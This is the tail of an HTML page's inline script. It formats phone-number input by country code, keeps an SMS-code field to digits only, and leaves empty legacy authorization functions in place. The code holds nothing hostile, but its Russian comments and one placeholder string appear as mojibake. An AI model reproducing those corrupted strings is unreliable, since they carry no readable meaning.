                            formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 8) + ' ' + value.substring(8);
                        } else {
                            formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 8) + ' ' + value.substring(8, 10);
                        }
                    }
                    
                    e.target.value = formattedValue;
                });
                
                // –û–±–Ω–æ–≤–ª—è–µ–º placeholder –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –≤—ã–±—Ä–∞–Ω–Ω–æ–π —Å—Ç—Ä–∞–Ω—ã
                phoneInput.addEventListener('focus', function() {
                    const countryCode = document.getElementById('country-code').value;
                    if (countryCode === '+7') {
                        phoneInput.placeholder = '999 123 45 67';
                    } else if (countryCode === '+1') {
                        phoneInput.placeholder = '555 123 4567';
                    } else if (countryCode === '+380') {
                        phoneInput.placeholder = '99 123 4567';
                    } else {
                        phoneInput.placeholder = '–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞';
                    }
                });
            }
            
            // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ SMS –∫–æ–¥–∞
            const smsInput = document.getElementById('sms-code-input');
            if (smsInput) {
                smsInput.addEventListener('input', function(e) {
                    e.target.value = e.target.value.replace(/[^0-9]/g, '');
                });
            }
        });
        
        // –°—Ç–∞—Ä—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ (–æ—Å—Ç–∞–≤–ª—è–µ–º –¥–ª—è —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏)
        function requestAuthorization() {
            showAuthSection();
        }
        
        function getAuthCode() {
            // –ù–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ –Ω–æ–≤–æ–π –≤–µ—Ä—Å–∏–∏
        }
        
        function verifyCode() {
            // –ù–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ –Ω–æ–≤–æ–π –≤–µ—Ä—Å–∏–∏
        }
    </script>
</body>
</html>
